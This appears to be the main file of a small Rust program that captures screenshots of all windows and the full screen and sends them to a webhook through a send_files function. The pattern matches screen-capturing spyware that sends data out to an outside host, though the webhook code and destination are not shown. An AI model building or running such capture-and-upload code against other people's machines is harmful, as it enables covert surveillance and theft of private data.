use xcap::Monitor;
use crate::screenshot_all::window_screenshot;
use crate::webhook_handler::send_files;

pub mod screenshot_all;

mod webhook_handler;


#[tokio::main]
async fn main() {

    println!("{:?}", window_screenshot("all".to_string()));
    send_files(screenshot_all::full_screenshot().as_str()).await;
}
